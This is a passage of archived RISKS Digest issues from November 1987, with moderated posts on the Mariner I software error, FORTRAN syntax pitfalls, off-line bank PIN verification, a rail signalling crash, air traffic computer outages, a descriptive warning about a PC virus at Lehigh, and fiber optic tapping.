	aka ...nbires!boulder!cdash       aka  (303) 593-3492

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.64.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.66.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-18</DOCNO>
<DOCOLDNO>IA012-000130-B022-214</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.66.html 128.240.150.127 19970217014328 text/html 21618
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:41:55 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 66</TITLE>
<LINK REL="Prev" HREF="/Risks/5.65.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.67.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.65.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.67.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 66</H1>
<H2> Friday, 27 November 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Mariner I 
</A>
<DD>
<A HREF="#subj1.1">
Eric Roberts
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  FORTRAN pitfalls 
</A>
<DD>
<A HREF="#subj2.1">
Jim Duncan
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  PIN verification 
</A>
<DD>
<A HREF="#subj3.1">
Otto J. Makela
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Sudden acceleration revisited 
</A>
<DD>
<A HREF="#subj4.1">
Leslie Burkholder
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: CB radio and power 
</A>
<DD>
<A HREF="#subj5.1">
Maj. Doug Hardie
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  An earlier train crash -- Farnley Junction 
</A>
<DD>
<A HREF="#subj6.1">
Clive D.W. Feather
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Mariner I
</A>
</H3>
<address>
Eric Roberts
&lt;<A HREF="mailto:roberts@src.DEC.COM ">
roberts@src.DEC.COM 
</A>&gt;
</address>
<i>
Wed, 25 Nov 87 18:33:14 pst
</i><PRE>

When Steve Berlin and I were writing the chapter on SDI for the new CPSR
book _Computers in Battle_ (Boston: Harcourt Brace Jovanovich, 1987), I
tried to track down a more complete reference to the Mariner I story.
The theory that this was due to the substitution of a period for a comma
in a FORTRAN DO statement seems to stem initially from the following
quote from G.J.Meyers, _Software Reliability: Principles and Practice_
(New York: John Wiley, 1976):

      In a FORTRAN program controlling the United States' first
      mission to Venus, a programmer coded a DO statement in a
      form similar to the following:

                             DO 3 I = 1.3P

      The mistake he made was coding a period instead of a comma.
      However, the compiler treated this as an acceptable
      assignment statement because FORTRAN has no reserved words,
      blanks are ignored, and variables do not have to be
      explicitly declared.  Although the statement is obviously an
      invalid DO statement, the compiler interpreted it as setting
      a new variable DO3I equal to 1.3.  This "trivial" error
      resulted in the failure of the mission.  Of course, part of
      the responsibility for this billion-dollar error falls on
      the programmer and test personnel, but is not the design of
      the FORTRAN language also partially to blame?

Unfortunately, Meyers lists no references for this version of history.
Some years ago, as part of the background work for the slide show
_Reliability and Risk_, Steve Berlin had called to ask about sources for
this story.  Meyers could not remember an exact source.

Since this much tracing left me without a definitive source, I checked
the _New York Times_ index and _Readers' Guide_ indices for 1962.  The
most informative article appeared in the _New York Times_ of Saturday,
July 28--six days after the aborted launch:

                           For Want of Hyphen
                          Venus Rocket Is Lost

                            By GLADWIN HILL
                     Special to the New York Times

         LOS ANGELES, July 27--The omission of a hyphen in some
      mathematical data caused the $18,500,000 failure of a
      spacecraft launched toward Venus last Sunday, scientists
      disclosed today.
         The spacecraft, Mariner I, veered off course about four
      minutes after its launching from Cape Canaveral, Fla., and
      had to be blown up in the air.
         The error was discovered here this week in analytical
      conferences of scientists and engineers of the National
      Aeronautics and Space Administration, the Air Force and the
      California Institute of Technology Jet Propulsion
      Laboratory, manager of the project for N.A.S.A.
         Another launching will be attempted some time in August.
      Plans had been suspended pending discovery of what went
      wrong with the first firing.
         The hyphen, a spokesman for the laboratory explained, was
      a symbol that should have been fed into a computer, along
      with a mass of other coded mathematical instructions.  The
      first phase of the rocket's flight was controlled by radio
      signals based on this computer's calculations.
         The rocket started out perfectly on course, it was
      stated.  But the inadvertent omission of the hyphen from the
      computer's instructions caused the computer to transmit
      incorrect signals to the spacecraft....

The first paragraph makes it sound as if this might be a data entry
error and not a coding error at all.  Later paragraphs, however,
indicate that this was part of the "coded mathematical instructions."
Other references to the Mariner I failure appear in the letters section
of the _New York Times_ of August 2 (page 24) and in the August 6 issue
of _Newsweek_ (page 75) and seem to corroborate the view that this was a
programming error.

This account agrees with the recent report from Henry Spencer (<A HREF="/Risks/5.64.html">RISKS-5.64</A>)
who cites "Far Travellers" by Oran W. Nicks.  On the whole, this explanation
seems to have more documentary evidence than the FORTRAN version of the story 
presented by Meyers.  The existence of other overstatements in his account
(in particular, $18,500,000 &lt;&lt; $1,000,000,000) also reduces its credibility.

Of course, the FORTRAN version of the story has received widespread
distribution of late (it is, after all, a lovely story), including citations in

   o  Jim Horning, "Note on Program Reliability," _Software
      Engineering Notes_, 4:4, October 1979, p. 6.
   o  Peter Neumann, "Letter from the Editor," _Software Engineering
      Notes_, 8:5, October 1983, p. 4 (credited to David Smith of
      CMU, who heard it from his instructor in 1970 or 1971).
   o  H.S. Tropp, "Fortran Anecdotes," _Annals of the History of
      Computing_, 6:1, January 1984, p. 61.
   o  Peter Neumann, "Risks to the Public," _Software Engineering
      Notes_, 11:5, October 1986, p. 17.

However, unless there is more definitive evidence to support this, I
think it must be regarded as apocryphal.

My own solution in _Computers in Battle_ was to write:

      Shortly after its launch on July 22, 1962, the Mariner I
      Venus probe veered off course and had to be destroyed by
      mission control officials.  The problem was later traced to
      a single character error in the controlling software.

This covers both explanations and seems to be on relatively safe ground.

/Eric
                                   [Yes, but it bugs the question.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
FORTRAN pitfalls (Re: <A HREF="/Risks/5.63.html">RISKS-5.63</A>)
</A>
</H3>
<address>
Jim Duncan 
&lt;<A HREF="mailto:jim@xanth.cs.odu.edu">
jim@xanth.cs.odu.edu
</A>&gt;
</address>
<i>
Thu, 26 Nov 87 13:40:20 EST
</i><PRE>
Organization: Old Dominion University, Norfolk Va.

(Regarding the DO ... I=1.3 problem:)

I too have heard this `story' many times, and each time the space vehicle took
on a new name, and it was on its way to a different planet or mission.  The
text I am reading for a course in principles of programming languages is the
first place I have seen this incident documented.  The author is discussing
the design of syntactic structures in FORTRAN and the unfortunate effects of
adopting a lexical convention that caused blanks to be ignored everywhere:

  "In FORTRAN, the statement

	DIMENSION IN DATA (10000), RESULT (8000)

  is exactly equivalent to

	DIMENSIONINDATA(10000),RESULT(8000)

  and, for that matter,

	D I M E N S I O N IN DATA (10000), RESULT (8000)

  While this may seem to be a harmless convenience, in fact it can cause
  serious problems for both compilers and human readers.  Consider this legal
  FORTRAN statement:

	DO 20 I = 1.100

  which looks remarkably like the DO-statement:

	DO 20 I = 1,100

  In fact, it is an assignment statement of the number 1.100 to a variable
  called `DO20I', which we can see by rearranging the blanks:

	DO20I = 1.100

  You will probably say that no programmer would ever call a variable `DO20I',
  and that is correct.  But suppose the programmer _intended_ to type the
  DO-statement above but accidentally types a period instead of a comma (they
  are next to each other on the keyboard).  The statement will have been
  transformed into an assignment to `DO20I'.  The programmer will probably not
  notice the error because `,' and `.' look so much alike.  In fact, there will
  be no clue that an error has been made because, conveniently, the variable
  `DO20I' will be automatically declared.  If you think things like this can't
  happen, you will be surprised to learn that an American Viking Venus probe
  was lost because of precisely this error."

The above is from Bruce J. MacLennan, _Principles_of_Programming_Languages_
(second edition), CBS College Publishing, 1987, pp. 89-90.  Mr. MacLennan goes
on to elaborate on the principles of good language design violated by FORTRAN,
such as Defense in Depth.

To add my two-cents worth:  When I first heard the Viking story, I inferred
that the offending DO-statement was in the code which either positioned the
navigational motors, or did the navigation calculations.  I was told that the
launch went perfectly and the probe reached the desired earth orbit.  When the
probe fired its motors to leave earth orbit, however, it supposedly rolled
over on its back, fired in the wrong direction, and promptly _disappeared_
from all tracking systems.  No one knows where the hell it went....

Jim Duncan, Computer Science Dept, Old Dominion Univ, Norfolk VA 23529-0162
(804)440-3915     INET: jim@xanth.cs.odu.edu    UUCP: ...!sun!xanth!jim

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
 PIN verification
</A>
</H3>
<address>

&lt;<A HREF="mailto:MAKELA_O%FINJYU.bitnet@csl.sri.com">
MAKELA_O%FINJYU.bitnet@csl.sri.com
</A>&gt;
</address>
<i>
Thu, 26 Nov 87 13:11 O
</i><PRE>
To: RISKS@csl.sri.com

In RISKS 5.61, John Pershing &lt;PERSHNG@ibm.com&gt; writes:
  &gt;I cannot speak for *all* ATM and POS systems, but the major banks
  &gt;generally know what they are doing with respect to PIN security.  The PIN
  &gt;number is *not* stored on your ATM card -- it is stored in your bank's
  &gt;database and, possibly, in one or more interbank clearinghouses.  This
  &gt;makes it possible to have your PIN changed without getting the card
  &gt;re-magnetized (assuming your bank has it's act together).  Note that your
  &gt;account number probably isn't even written on the card -- only a number
  &gt;that identifies that particular card. [...]
  &gt;John A. Pershing Jr., IBM, Yorktown Heights

Well, it *would* seem that the Finnish banks use a different system.  Perhaps
I should first describe the most common types of plastics we have here:

* the autoteller cards, that can only be used in ATM's
* the "Bank Cards", that work at ATM's and can be used for buying stuff;
  using them is legally the same as writing out a cheque for the same amount
* the VISA-combocard, that is a combined ATM/Bank Card/VISA-card; when you
  use them for buying stuff you have to tell what you want it to be used as

All the abovementioned cards DO have the attached account number on them.
It is possible also to have SEVERAL accounts on them, but I'm not sure how
this is accomplished.  This option is only offered by one bank, so it might
be just their hack.

Follows a paragraph from the official guide to implementing off-line
POS terminals using magnetic card identification:

        PIN-verification is done by the Security Unit, which is connected
        to the POS terminal, according to the the PVV-number, which is read
        off the magnetic stripe of the card.  The requirements for PIN-
        verification are given separately in "POS terminal security standards".
        Written requests for the distribution of these standards may be sent
        to AIP-security Chief Lars Anrkil, SKOP (Kilo), PL 400, 00101
        HELSINKI.

[SKOP is a big Finnish banking group, more or less a "collection of competing
fiefdoms", as David G. Grubbs &lt;dgg@dandelion.CI.COM&gt; put it in RISKS 5.61;
it would seem that the Finnish Banking Association has given them the job of
maintaining and distributing these security standards.]

Here's a few arguments against the systems working by being on-line to the
bank computer or some other similar system:

* the guide was for OFF-LINE POS terminals.
* the same PIN-numbers are used internationally, in VISA-card -based ATM-type
  machines, where you use your VISA-combocard to get money that will be billed
  in your next VISA bill.  I have difficulties believing that even in this
  information age they would maintain a computer link from all over the world
  to remote Finland :-)
* I have several times went to an ATM that is used by several banks in co-
  operation, inserted my card, typed in my PIN and received a message saying
  "Your bank's computer is down".  The PIN was verified BEFORE the ATM tried
  to contact my bank's computer.
* I have asked several times if it is possible to change my card's PIN number
  (just to know if it is possible), and have always received a reply stating
  "no, it's not possible, it's derived from your card number".  This is very
  weak, since bank people generally aren't that good on technical aspects...

I think these taken together are pretty strong indications that the PIN
verification CAN be done off-line, at least for the Finnish standard of cards.

I dearly do hope that security in these systems is not maintained by secrecy
ONLY!  However, I have had the company I work in part-time order the set of
security standards, so as soon as we get them, I'll let you people know more...

Otto J. Makela, U of Jyvaskyla
Mail: Kauppakatu 1 B 18, SF-40100 Jyvaskyla, Finland
Phone: +358 41 613 847
BBS: +358 41 211 562 (V.22bis/V.22/Bell 212A/V.21)
BitNet: MAKELA_OTTO_@FINJYU.bitnet

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Sudden acceleration revisited
</A>
</H3>
<address>
Leslie Burkholder 
&lt;<A HREF="mailto:lb0q+%andrew.cmu.edu@ROME.UCI.EDU">
lb0q+%andrew.cmu.edu@ROME.UCI.EDU
</A>&gt;
</address>
<i>
Thu, 26 Nov 87 13:15:59 -0500 (EST)
</i><PRE>

Honda motor company has offered replacements for the chip controlling
acceleration in the 88 Civic. Some people have complained of problems with
this chip in their Civics.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: CB radio and power (<A HREF="/Risks/5.64.html">RISKS-5.64</A>)
</A>
</H3>
<address>
"Maj. Doug Hardie" 
&lt;<A HREF="mailto:Hardie@DOCKMASTER.ARPA">
Hardie@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Wed, 25 Nov 87 11:44 EST
</i><PRE>

[For the record.  Truth-in-harmonics department.]

  &gt; The second harmonic of 26-27 Mhz signals rounds out to 104-108 Mhz, 
  &gt; or the upper half of commercial FM radio.  [Jeffrey R Kell.  <A HREF="/Risks/5.64.html">RISKS-5.64</A>]

According to my understanding of the new-new-math (I am a product of the new
math), that would have to be the fourth harmonic.
                                                         -- Doug

               [I hope no one pleads the fifth.  130-135 would sound 
               suspiciously like late Beethoven String Quartets.  
               Gesunta-heit.  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
An earlier train crash -- Farnley Junction
</A>
</H3>
<address>
"Clive D.W. Feather" 
&lt;<A HREF="mailto:mcvax!root.co.uk!cdwf@uunet.UU.NET">
mcvax!root.co.uk!cdwf@uunet.UU.NET
</A>&gt;
</address>
<i>

</i><PRE>
Date: 27 Nov 87 16:48:37 GMT
Organization: Root Computers Ltd, London, England

Not quite computers, but after the item in <A HREF="/Risks/5.64.html">RISKS-5.64</A> about the Swedish
train crash, readers might find this interesting.

Summary of official report on accident at Farnley Junction (Yorkshire)
in 1977, on British Railways.

Farnley Junction is a few miles from Leeds Signal Box, and is remotely
controlled from there. All safety interlocking logic is in the signal
box itself (all signalling in this area is carried out by 12V relay
logic). The distance is such that an intermediate repeater unit repeats
all relay signals between the junction and the box.

The physical layout is as follows:

                    \
        Little used  \
        branch line   \
                       \
                        -------*-----|
                     S          \
      ---&gt;-----------------------*------*-------------&gt;--- Up line
                                         \
      ---&lt;--------------------------------*-----------&lt;--- Down line
                                            S
   * = points, S = signal

Normal logic, e.g., for signals, is binary, but the controls and position
detection of the up-to-down-line crossover happened to be trinary (line A
positive = straight ahead, line B positive = cross over, neither positive
= no command / not correctly set).

On the day in question, a fault at the repeater unit was causing problems.
Both signals were set to Danger by the signalman, and an engineering team
then changed the rectifier in the power supply at the repeater unit.

The loss of power caused the main signalling logic to believe the crossover
was not correctly set (no repeat of the detection), and so it set the control
lines to drive the crossover back to the stright ahead position (this will
stay driven until the detection is correct - meantime, the signals are locked
at Danger).

Trains came to a halt at both signals.

The engineers restored power to the repeater, but had wired in the rectifier
the wrong way round. This had the effect of reversing the polarity of voltages
repeated - not important for binary signals.The crossover took the incoming
voltage as a command to move to the "crossover" position, and did so.
The detection mechanism correctly reported "crossover" - this was reversed
at the repeater, and the main signalling logic (correctly) took the incoming
signal to mean that the points were locked in the "straight ahead" position.

The signalman now set both signals to Proceed, and the signalling logic
allowed him to do so. The train on the Up line started off immediately
(the other driver was trying to figure out why the points were set the
wrong way !), traversed the crossover, and collided with the train on the
Down line, killing two people.

I know this isn't computing, but there's a lesson in it, even so.

         [Don't lessen the lesson by thinking this isn't computing.
         Circuitry, programs, algorithms, and people have much in common.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.65.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.67.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-19</DOCNO>
<DOCOLDNO>IA012-000130-B022-226</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.67.html 128.240.150.127 19970217014354 text/html 25399
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:42:09 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 67</TITLE>
<LINK REL="Prev" HREF="/Risks/5.66.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.68.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.66.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.68.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 67</H1>
<H2> Monday, 30 November 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Aging air traffic computer fails again 
</A>
<DD>
<A HREF="#subj1.1">
Rodney Hoffman
</A><br>
<A HREF="#subj1.2">
 Alan Wexelblat
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Computer Virus 
</A>
<DD>
<A HREF="#subj2.1">
Kenneth R. van Wyk via Jeffrey James Bryan Carpenter
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Fiber optic tap 
</A>
<DD>
<A HREF="#subj3.1">
Kenneth R. Jongsma
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  A new and possibly risky use for computer chips 
</A>
<DD>
<A HREF="#subj4.1">
John Saponara
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Selling Science [a review] 
</A>
<DD>
<A HREF="#subj5.1">
Peter J. Denning
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Risks to computerised traffic control signs 
</A>
<DD>
<A HREF="#subj6.1">
Peter McMahon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Risks in Energy Management Systems 
</A>
<DD>
<A HREF="#subj7.1">
Anon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  
</A>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
The RISKS Forum is moderated.  Contributions should be relevant, sound, in good
</A>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
taste, objective, coherent, concise, nonrepetitious.  Diversity is welcome. 
</A>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
Contributions to RISKS@CSL.SRI.COM, Requests to RISKS-Request@CSL.SRI.COM.
</A>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj12">
For Vol i issue j, FTP SRI.COM, CD STRIPE:&lt;RISKS&gt;, GET RISKS-i.j.
</A>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj13">
Volume summaries for each i in max j: (i,j) = (1,46),(2,57),(3,92),
</A>
<DD>
<A HREF="#subj13.1">
4
</A><br>
<A HREF="#subj13.2">
97
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Aging air traffic computer fails again
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
28 Nov 87 11:31:06 PST (Saturday)
</i><PRE>
To: RISKS@csl.sri.com
From: Rodney Hoffman &lt;Hoffman.es@Xerox.COM&gt;

In RISKS 4.48 (18 Feb. 87), I related how flights throughout Southern
California were delayed due to the failure of the "9020" air traffic computer
at the L.A. Air Route Traffic Control Center.  Since the 9020 failed 12 times
during the last six months of 1986, this story violates the masthead guidelines
about being nonrepetitious.  However, in the Feb. outage, it was reported that
the 18-year-old system was "expected to be replaced later this year" [1987].

Following Murphy's Law, not only has the replacement not yet happened, but the
system's latest failure was on one of the busiest travel days of the year --
the Wednesday before Thanksgiving, when the passenger load was 40% more than on
a normal weekday.  Additionally, a bomb scare forced an emergency landing of
one plane, further fouling flight schedules.

The computer failure, attributed by the L.A. Times to a "software problem" in
the "massive IBM computer ... that controls high-altitude air traffic for much
of California, Arizona, Nevada, and Utah" lasted 4.5 hours, delayed over 140
flights from Southern California airports for 30 minutes to two hours.  The
L.A. Air Route Traffic Control Center is one of 20 such FAA regional
facilities in the U.S.

Officials stress that the computer failure posed no danger to airline safety.
Instead, it forced controllers to shift to a slower backup computer and "to
carry printed information by hand, limiting the volum of traffic they can
handle."  The news accounts made no mention this time of a date for
installation of a replacement computer system.
                                                  -- Rodney Hoffman

</PRE>
<HR><H3><A NAME="subj1.2">
Air traffic computer failure?
</A>
</H3>
<address>
Alan Wexelblat 
&lt;<A HREF="mailto:wex@MCC.COM">
wex@MCC.COM
</A>&gt;
</address>
<i>
Fri, 27 Nov 87 12:21:03 CST
</i><PRE>

	COMPUTER BREAKDOWN SLOWS FLIGHTS IN WEST

Los Angeles(AP) - A five-hour air traffic control computer failure Wednesday
[the day before Thanksgiving] stalled the holiday weekend getaway for
thousands of Californians.  The computer broke down at about 5:30AM and
wasn't back in operation until about 10:30AM, said a spokesman for the
Federal Aviation Administration.  The computer in Palmdale, 60 miles north
of downtown LA, routes air traffic for Southern California and sections of
Nevada and Arizona.  The cause of the failure was not immediately
determined.  The failure forced controllers to shift to a backup system that
provides less information and the slowed operations, but no safety problems
were encountered, the FAA spokesman said.

--Alan Wexelblat   UUCP: {harvard, gatech, pyramid, &amp;c.}!sally!im4u!milano!wex

    [At San Francisco Airport they were advertising the worst day
    of the year, and delays did propagate...  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Computer Virus
</A>
</H3>
<address>
Jeffrey James Bryan Carpenter 
&lt;<A HREF="mailto:JJC%Vms.Cis.Pittsburgh.Edu@VB.CC.CMU.EDU">
JJC%Vms.Cis.Pittsburgh.Edu@VB.CC.CMU.EDU
</A>&gt;
</address>
<i>
Wed, 25 Nov 87 11:15 EDT
</i><PRE>
To: risks@csl.sri.com

  From:	IN%"MD4F@CMUCCVMA"  "User Services List (ADVISE-L)" 23-NOV-1987 09:33
  To:	Jeff Carpenter &lt;256521@vms.cis.pittsburgh.edu&gt;
  Subj:	Virus warning!
  Date: Mon, 23 Nov 87 08:05:57 EST
  From: "Kenneth R. van Wyk" &lt;@vms.cis.pittsburgh.edu:LUKEN@LEHIIBM1.BITNET&gt;
       
  Last week, some of our student consultants discovered a virus program
  that's been spreading rapidly throughout Lehigh University.  I thought
  I'd take a few minutes and warn as many of you as possible about this
  program since it has the chance of spreading much farther than just our
  University.  We have no idea where the virus started, but some users have
  told me that other universities have recently had similar probems.
       
  The virus: the virus itself is contained in the stack space of COMMAND.COM.
  When a pc is booted from an infected disk, all a user need do to spread
  the virus is to access another disk via TYPE, COPY, DIR, etc.  If the
  other disk contains COMMAND.COM, the virus code is copied to the other
  disk.  Then, a counter is incremented on the parent.  When this counter
  reaches a value of 4, any and every disk in the PC is erased thoroughly.
  The boot tracks are nulled, as are the FAT tables, etc.  All Norton's
  horses couldn't put it back together again...  :-)  This affects both floppy
  and hard disks.  Meanwhile, the four children that were created go on
  to tell four friends, and then they tell four friends, and so on, and so on.
       
  Detection: while this virus appears to be very well written, the author
  did leave behind a couple footprints.  First, the write date of the
  command.com changes.  Second, if there's a write protect tab on an
  uninfected disk, you will get a WRITE PROTECT ERROR...  So, boot up from
  a suspected virus'd disk and access a write protected disk - if an
  error comes up, then you're sure.  Note that the length of command.com
  does not get altered.
       
  I urge anyone who comes in contact with publicly accessible (sp?) disks
  to periodically check their own disks.  Also, exercise safe computing -
  always wear a write protect tab.  :-)
       
  This is not a joke.  A large percentage of our public site disks has
  been gonged by this virus in the last couple days.
       
  Kenneth R. van Wyk, User Services Senior Consultant, 
  Lehigh University Computing Center   (215)-758-4988
  &lt;LUKEN@LEHIIBM1.BITNET&gt;  &lt;LUKEN@VAX1.CC.LEHIGH.EDU&gt;
  
</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Fiber optic tap
</A>
</H3>
<address>
&lt;<A HREF="mailto:portal!cup.portal!Kenneth_R_Jongsma@Sun.COM">
portal!cup.portal!Kenneth_R_Jongsma@Sun.COM
</A>&gt;
</address>
<i>

</i><PRE>
Date: Sat Nov 28 18:09:48 1987

Up until now, one of the prime advantages of fiber optic cable (aside from its
capacity) has been its perceived resistance to being tapped by unauthorized
parties. The Nov. 16th issue of EE Times had an interesting article that may
change those perceptions.

EE Times reports that Plessey has developed a non-intrusive way of tapping
fiber optic cable. The article states that Plessey's design concept has been
tested with both high-speed digital as well as television signals. They don't
go into details, but do say that the device clamps over an existing cable and
bends it slightly. The small amount of light that is released from the cable
can be detected and amplified.

They do acknowledge the fact that this causes problems for system security, but
feel that the advantages (primarily in making it cheaper to use fiber as a
cable tv medium) outweigh any disadvantages.

I find the implications of this development rather startling.  They don't give
a price for the device, but given that it is intended to be used as a cable tv
line splitter, it can't be out of the reach of any individual.

</PRE>
